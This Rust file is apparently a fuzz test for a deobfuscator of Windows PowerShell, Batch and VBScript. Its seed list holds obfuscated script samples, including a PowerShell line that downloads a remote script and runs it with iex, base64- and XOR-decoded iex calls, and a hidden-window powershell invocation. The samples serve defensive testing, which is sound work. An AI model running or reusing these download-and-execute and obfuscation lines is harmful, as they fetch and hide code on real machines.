#![allow(clippy::expect_used, clippy::unwrap_used, clippy::panic)]
use std::panic::{self, AssertUnwindSafe};
use std::sync::Once;

use disrobe_pass_scriptlang::WinScriptLang;
use disrobe_pass_scriptlang::lang::winscript;

struct XorShift64 {
    state: u64,
}

impl XorShift64 {
    const fn new(seed: u64) -> Self {
        Self { state: seed | 1 }
    }

    const fn next_u64(&mut self) -> u64 {
        let mut x: u64 = self.state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.state = x;
        x
    }

    const fn next_usize(&mut self, bound: usize) -> usize {
        if bound == 0 {
            return 0;
        }
        (self.next_u64() % bound as u64) as usize
    }

    const fn next_byte(&mut self) -> u8 {
        (self.next_u64() & 0xff) as u8
    }
}

const SEEDS: &[&str] = &[
    "powershell.exe -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
    "iex (New-Object Net.WebClient).DownloadString('http://x/y')",
    "$d=[Convert]::FromBase64String('SGVsbG8gV29ybGQgZnJvbSBzY3JpcHQ='); iex $d",
    "@echo off\r\nset a=cmd\r\nset b=.exe\r\ncall %a%%b%\r\ngoto :eof",
    "@echo off\r\nset payload=powershell -nop -w hidden\r\necho %payload:~0,10%",
    "Set obj = CreateObject(\"WScript.Shell\")\r\nobj.Run \"calc.exe\"",
    "$s='I'+'E'+'X'; $t=ChrW(104)&ChrW(105); Write-Host $s",
    "powershell -c \"$x=('{0}{1}' -f 'IE','X'); &$x\"",
    "[char[]](105,101,120,32,40,78,101,116,41) -join ''",
    "$p='dlrowolleh'[-1..-99] -join ''; iex $p",
    "$k='nidmloc'.Replace('n','X'); ConvertTo-SecureString 'sekret' -AsPlainText -Force",
    "powershell -enc TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA=",
    "$b=[Convert]::FromBase64String('QUJDREVGR0g='); $x=$b | %{$_ -bxor 0x42}; iex",
    "Dim s : s = Chr(72) & Chr(73) : MsgBox s",
    "for /f \"tokens=*\" %%i in (list.txt) do call :proc %%i",
];

fn entry_points(bytes: &[u8]) {
    let _ = winscript::analyze(bytes);
    let _ = winscript::looks_like_winscript(&String::from_utf8_lossy(bytes));
    let text: String = winscript::decode_text(bytes);
    let _ = winscript::decode_utf16le(bytes);
    let _ = winscript::classify(&text);
    let _ = winscript::base64_blobs(&text);
    let _ = winscript::base64_decode(&text);
    let _ = winscript::strip_backticks(&text);
    let _ = winscript::strip_carets(&text);
    let _ = winscript::decode_encoded_command(&text);
    let _ = winscript::rebuild_string_concat(&text);
    let _ = winscript::rebuild_format_operator(&text);
    let _ = winscript::rebuild_replace(&text);
    let _ = winscript::rebuild_string_reverse(&text);
    let _ = winscript::rebuild_char_builder(&text);
    let _ = winscript::rebuild_char_codes(&text);
    let _ = winscript::resolve_batch_substrings(&text);
    let _ = winscript::detect_embedded_pe(&text);
    let _ = winscript::recover_securestring_plaintext(&text);
    for lang in [
        WinScriptLang::PowerShell,
        WinScriptLang::Batch,
        WinScriptLang::VbScript,
    ] {
        let _ = winscript::recover(lang, &text);
    }
}

fn mutate(rng: &mut XorShift64, base: &[u8], out: &mut Vec<u8>) {
    out.clear();
    out.extend_from_slice(base);
    let edits: usize = 1 + rng.next_usize(8);
    for _ in 0..edits {
        if out.is_empty() {
            out.push(rng.next_byte());
            continue;
        }
        match rng.next_usize(7) {
            0 => {
                let idx: usize = rng.next_usize(out.len());
                out[idx] = rng.next_byte();
            }
            1 => {
                let idx: usize = rng.next_usize(out.len() + 1);
                out.insert(idx, rng.next_byte());
            }
            2 => {
                let idx: usize = rng.next_usize(out.len());
                out.remove(idx);
            }
            3 => {
                let cut: usize = rng.next_usize(out.len() + 1);
                out.truncate(cut);
            }
            4 => {
                let byte: u8 = match rng.next_usize(6) {
                    0 => b'%',
                    1 => b'\'',
                    2 => b'"',
                    3 => b'`',
                    4 => b'^',
                    _ => b':',
                };
                let idx: usize = rng.next_usize(out.len() + 1);
                out.insert(idx, byte);
            }
            5 => {
                let n: usize = rng.next_usize(32);
                for _ in 0..n {
                    out.push(0xff);
                }
            }
            _ => {
                let idx: usize = rng.next_usize(out.len());
                out[idx] = out[idx].wrapping_add(0x80);
            }
        }
    }
}

static SILENCE_HOOK: Once = Once::new();

fn silence_panics() {
    SILENCE_HOOK.call_once(|| {
        panic::set_hook(Box::new(|_| {}));
    });
}

fn check(input: &[u8]) -> Option<Vec<u8>> {
    let snapshot: Vec<u8> = input.to_vec();
    let probe: Vec<u8> = snapshot.clone();
    let result: Result<(), _> = panic::catch_unwind(AssertUnwindSafe(|| {
        entry_points(&probe);
    }));
    result.is_err().then_some(snapshot)
}

#[test]
fn fuzz_winscript_entry_points_never_panic() {
    const MAX_INPUT: usize = 16 * 1024;
    silence_panics();
    let mut rng: XorShift64 = XorShift64::new(0x9E37_79B9_7F4A_7C15);
    let mut buf: Vec<u8> = Vec::with_capacity(MAX_INPUT);
    let mut failure: Option<Vec<u8>> = None;

    for seed in SEEDS {
        if let Some(bad) = check(seed.as_bytes()) {
            failure = Some(bad);
            break;
        }
    }

    if failure.is_none() {
        let iterations: usize = 40_000;
        for _ in 0..iterations {
            let base: &str = SEEDS[rng.next_usize(SEEDS.len())];
            mutate(&mut rng, base.as_bytes(), &mut buf);
            if buf.len() > MAX_INPUT {
                buf.truncate(MAX_INPUT);
            }
            if let Some(bad) = check(&buf) {
                failure = Some(bad);
                break;
            }
        }
    }

    if failure.is_none() {
        let mut random_rng: XorShift64 = XorShift64::new(0xDEAD_BEEF_CAFE_F00D);
        for _ in 0..20_000 {
            let len: usize = random_rng.next_usize(512);
            buf.clear();
            for _ in 0..len {
                buf.push(random_rng.next_byte());
            }
            if let Some(bad) = check(&buf) {
                failure = Some(bad);
                break;
            }
        }
    }

    let _ = panic::take_hook();
    if let Some(bad) = failure {
        panic!(
            "panic on {} bytes: bytes={:?} lossy={:?}",
            bad.len(),
            bad,
            String::from_utf8_lossy(&bad)
        );
    }
}
